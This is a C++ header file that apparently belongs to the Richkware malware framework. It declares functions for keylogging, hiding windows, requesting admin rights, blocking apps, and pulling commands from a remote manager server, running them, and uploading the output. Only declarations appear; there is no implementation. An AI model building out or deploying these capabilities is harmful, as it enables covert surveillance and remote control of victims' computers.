/*
*      Copyright 2016 Riccardo Melioli.
*/

#ifndef RICHKWARE_H_
#define RICHKWARE_H_

#define _WIN32_WINNT 0x501

#include <winsock2.h>
#include <windows.h>
#include <shellapi.h>
#include <winbase.h>
#include <winreg.h>
#include <winuser.h>
//#include <ws2tcpip.h>

#include <fstream>
#include <stdio.h>
#include <stdlib.h>
#include <conio.h>
#include <string.h>
#include <cstring>
#include <string>
#include <iterator>
#include <list>

#include "utils.h"
#include "crypto.h"
#include "blockApps.h"
#include "network.h"
#include "storage.h"

/**
 * Structure containing all information to connect with Richkware-Manager-Server
 */
struct RmsInfo {
    const char *defaultEncryptionKey;
    const char *serverAddress;
    const char *port;
    const char *serviceName;
    const char *associatedUser;

/**
 *
 * @param defaultEncryptionKey: pre-shared key with RMS, to enable encryption before receiving a server-side generated key
 * @param serverAddress: Richkware-Manager-Server IP address
 * @param port: Richkware-Manager-Server TCP port
 * @param serviceName: Richkware-Manager-Server service name
 * @param associatedUser: account in RMS which is linked to
 */
    RmsInfo(const char *defaultEncryptionKey, const char *serverAddress, const char *port, const char *serviceName,
            const char *associatedUser);
};

class Richkware {
private:
    std::string appName;
    std::string encryptionKey;
public:
    BlockApps blockApps;
    Network network;
    Session session;
    SystemStorage systemStorage;

    Richkware(const char *AppNameArg, std::string EncryptionKeyArg);

    // Get secure key from Richkware-Manager-Server and set it as encryption key. DefaultPass is used as temporary
    // encryption key to ensure a safety communication with RMS and if this app cannot reach the RMS, then it will
    // use DefaultPass as encryption key.
    Richkware(const char *AppNameArg, RmsInfo rmsInfo);

    BOOL IsAdmin();

    void RequestAdminPrivileges();

    void StealthWindow(const char *window);

    void OpenApp(const char *app);

    void Keylogger(const char *fileName);

    void Hibernation();

    void RandMouse();

    std::vector<std::string> getCommands();

    std::string executeCommand(std::string command);

    void uploadCommandsResponse(std::string output);

};

DWORD WINAPI KeyloggerThread(void *arg);

#endif /* RICHKWARE_H_ */
